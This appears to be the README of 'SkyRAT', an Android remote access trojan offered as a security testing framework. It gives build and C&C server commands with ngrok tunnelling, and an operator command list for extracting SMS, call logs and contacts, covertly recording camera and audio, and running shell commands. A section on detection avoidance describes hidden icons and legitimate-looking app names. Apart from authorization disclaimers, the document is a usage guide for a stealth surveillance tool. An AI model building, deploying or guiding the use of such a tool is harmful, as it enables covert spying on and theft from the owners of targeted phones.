# SkyRAT - Android Security Testing Framework

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Android-brightgreen.svg)](https://android.com)

**SkyRAT** is a comprehensive Android security testing framework designed for authorized penetration testing and security research. This tool helps security professionals assess Android device security by providing remote access and control capabilities.

> ⚠️ **IMPORTANT**: This tool is intended for authorized security testing only. Use only on devices you own or have explicit permission to test.

## 🚀 Features

### Core Capabilities
- **Remote Command Execution**: Full shell access to Android devices
- **File System Operations**: Upload, download, and manipulate files
- **Data Extraction**: Access SMS, call logs, contacts, and media files
- **Audio/Video Recording**: Capture audio and video remotely
- **System Information**: Comprehensive device and system details
- **Network Operations**: Ping, netstat, and connectivity testing

### Advanced Features
- **Source-based Building**: Build APKs from Kotlin source code
- **Ngrok Integration**: External access through secure tunnels
- **Stealth Mode**: Hidden app icon and background operation
- **Persistence**: Multiple mechanisms for maintaining access
- **Cross-Platform Server**: Python-based C&C server

## 📋 Prerequisites

### Python Environment
- Python 3.7 or higher
- pip3 for package management

### Android Development
- Java Development Kit (JDK) 8 or higher
- Android SDK command line tools (for building APKs)
- Gradle (included via wrapper)

### Optional
- Ngrok account (for external tunnels)
- Android device or emulator for testing

## 🛠️ Installation

### 1. Clone the Repository
```bash
git clone https://github.com/techsky-eh/skyrat.git
cd skyrat
```

### 2. Create Virtual Environment
```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate  # Linux/macOS
# or
venv\Scripts\activate     # Windows
```

### 3. Install Python Dependencies
```bash
pip3 install -r requirements.txt
```

### 4. Setup Android SDK
```bash
# Linux/macOS
chmod +x tools/android-sdk-setup.sh
./tools/android-sdk-setup.sh

# Or manually install Android SDK and set ANDROID_HOME
```

### 5. Verify Installation
```bash
python3 skyrat.py --help
```

## 🎯 Quick Start

### Building an APK

#### Basic APK Build
```bash
# Build APK for local network
python3 skyrat.py --build -i 192.168.1.100 -p 8000 -o test.apk

# Build with visible app icon
python3 skyrat.py --build -i 192.168.1.100 -p 8000 --visible-icon -o visible.apk
```

#### External Access with Ngrok
```bash
# Build APK with ngrok tunnel
python3 skyrat.py --build --ngrok -p 8000 -o remote.apk
```

### Starting the C&C Server

#### Local Server
```bash
# Start server for local connections
python3 skyrat.py --shell -i 192.168.1.100 -p 8000
```

#### External Server with Ngrok
```bash
# Server will start automatically after ngrok build
python3 skyrat.py --build --ngrok -p 8000 -o tunnel.apk
```

## 📱 APK Installation

### Method 1: ADB Install
```bash
adb install skyrat.apk
```

### Method 2: Manual Install
1. Transfer APK to device
2. Enable "Install from Unknown Sources"
3. Install the APK
4. Grant all requested permissions

## 🔧 Usage

### Command Interface
Once connected, you can use various commands:

#### Device Information
```bash
SkyRAT:/> deviceInfo        # Complete device information
SkyRAT:/> getIP             # Device IP address
SkyRAT:/> getSimDetails     # SIM card information
SkyRAT:/> sysinfo           # System information
```

#### File Operations
```bash
SkyRAT:/> ls /sdcard/       # List directory contents
SkyRAT:/> download /sdcard/photo.jpg  # Download file
SkyRAT:/> upload localfile.txt        # Upload file
SkyRAT:/> delete /sdcard/unwanted.txt # Delete file
```

#### Data Extraction
```bash
SkyRAT:/> getSMS inbox      # Get inbox SMS
SkyRAT:/> getCallLogs       # Get call history
SkyRAT:/> getContacts       # Get contact list
SkyRAT:/> getApps           # Get installed apps
```

#### Recording
```bash
SkyRAT:/> camList           # List available cameras
SkyRAT:/> startVideo 0      # Start video recording
SkyRAT:/> stopVideo         # Stop and download video
SkyRAT:/> startAudio        # Start audio recording
SkyRAT:/> stopAudio         # Stop and download audio
```

#### System Control
```bash
SkyRAT:/> shell ls -la      # Execute shell command
SkyRAT:/> ps                # List running processes
SkyRAT:/> kill com.app.name # Kill process
SkyRAT:/> vibrate 3         # Vibrate device
```

### Help System
```bash
SkyRAT:/> help              # Show all available commands
SkyRAT:/> clear             # Clear screen
SkyRAT:/> exit              # Exit connection
```

## 📂 Project Structure

```
SkyRAT/
├── skyrat.py                 # Main entry point
├── utils/                    # Core utilities
│   ├── server.py            # C&C server functionality
│   ├── builder.py           # APK building logic
│   ├── network.py           # Network utilities
│   └── __init__.py          # Package initialization
├── android/                  # Android source code
│   ├── app/src/main/java/   # Java/Kotlin source
│   └── build.gradle.kts     # Build configuration
├── build/                    # Output APKs
├── dumps/                    # Downloaded data
├── tools/                    # Build scripts
└── docs/                     # Documentation
```

## ⚙️ Configuration

### Server Configuration
Edit `android/app/src/main/java/com/techsky/skyrat/Config.kt`:
```kotlin
object Config {
    const val IP = "YOUR_SERVER_IP"
    const val PORT = "YOUR_SERVER_PORT"
    const val ICON = true  // true = hidden, false = visible
}
```

### Build Configuration
Modify `android/app/build.gradle.kts` for:
- App name and package
- Target SDK version
- Permissions
- Signing configuration

## 🔒 Security Considerations

### Permissions Required
The APK requests extensive permissions for testing purposes:
- Camera and microphone access
- Storage read/write
- SMS and call log access
- Contacts access
- Location access
- Phone state access

### Network Security
- All communication is over TCP (not encrypted by default)
- Consider using VPN or secure tunnels for sensitive testing
- Ngrok provides HTTPS tunneling for external access

### Detection Avoidance
- Hidden app icon (configurable)
- Background service operation
- Minimal UI presence
- Legitimate-looking app name

## 🧪 Testing Environment

### Recommended Setup
1. Isolated test network
2. Dedicated test devices
3. Virtual machines for server
4. Documentation of all testing activities

### Legal Compliance
- Obtain written authorization before testing
- Test only on owned or authorized devices
- Follow responsible disclosure practices
- Comply with local cybersecurity laws

## 🤝 Contributing

### Development Setup
```bash
# Clone with development branch
git clone -b develop https://github.com/techsky-eh/skyrat.git

# Install development dependencies
pip3 install -r requirements-dev.txt

# Run tests
python3 -m pytest tests/
```

### Contribution Guidelines
1. Fork the repository
2. Create feature branch
3. Make changes with tests
4. Submit pull request
5. Follow code style guidelines

## 📖 Documentation

- [Installation Guide](docs/installation.md)
- [Usage Manual](docs/usage.md)
- [Command Reference](docs/commands.md)
- [API Documentation](docs/api.md)
- [Troubleshooting](docs/troubleshooting.md)

## 🐛 Troubleshooting

### Common Issues

#### Build Failures
```bash
# Check Java installation
java -version

# Check Android SDK
echo $ANDROID_HOME

# Clean build
python3 skyrat.py --build --clean
```

#### Connection Issues
```bash
# Check port availability
netstat -ln | grep 8000

# Test local connectivity
telnet localhost 8000

# Check firewall settings
```

#### Permission Denied
- Ensure all permissions are granted
- Check Android security settings
- Verify app is not blocked by security software

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**Important**: This license applies only to authorized security research and testing. Unauthorized use is prohibited.

## ⚖️ Legal Disclaimer

This tool is provided for educational and authorized security testing purposes only. The authors and contributors:

- Do not condone illegal activities
- Are not responsible for misuse of this tool
- Recommend following responsible disclosure practices
- Advise compliance with all applicable laws and regulations

Users are solely responsible for ensuring their use of this tool complies with local laws and regulations.

## 👥 Credits

**SkyRAT** is developed by the **Tech Sky Security Research Team**.

### Acknowledgments
- Android security research community
- Open source security tools contributors
- Responsible disclosure advocates

## 📞 Support

### Community Support
- GitHub Issues: [Report bugs and feature requests](https://github.com/techsky-eh/skyrat/issues)
- Discussions: [Community discussions](https://github.com/techsky-eh/skyrat/discussions)

### Security Research
For security research collaboration or responsible disclosure:
- Email: contact@techskyhub.com
- GPG Key: [Available on request]

---

**Remember**: With great power comes great responsibility. Use this tool ethically and legally.